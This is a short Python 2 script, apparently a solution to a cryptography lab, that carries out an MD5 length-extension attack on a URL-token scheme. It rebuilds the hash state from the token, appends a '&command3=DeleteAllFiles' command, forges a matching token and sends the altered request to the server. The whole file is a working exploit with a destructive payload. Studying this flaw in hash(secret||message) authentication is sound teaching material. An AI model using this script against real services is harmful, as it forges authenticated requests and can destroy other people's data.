import httplib, urlparse, sys
url = sys.argv[1]

from pymd5 import md5, padding
import urllib

segments = urlparse.urlparse(url).query.split("&")     # creates a list with the token, user, and commands
token = segments[0]
rest = segments[1:]
length_of_m = len("&".join(rest)) + 8     # length of value orignally passed into md5
h = md5(state = token[6:].decode("hex"), count = (length_of_m + len(padding(length_of_m*8)))*8)     # requests a new token
h.update("&command3=DeleteAllFiles")     # updates token to include command3
segments[0] = "token=" + h.hexdigest()     # replaces token value in list with new value

# constructs the new url
url = urlparse.urlparse(url).scheme + "://" + urlparse.urlparse(url).netloc + urlparse.urlparse(url).path + "?" + "&".join(segments) + urllib.quote(padding(length_of_m*8)) + "&command3=DeleteAllFiles"

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()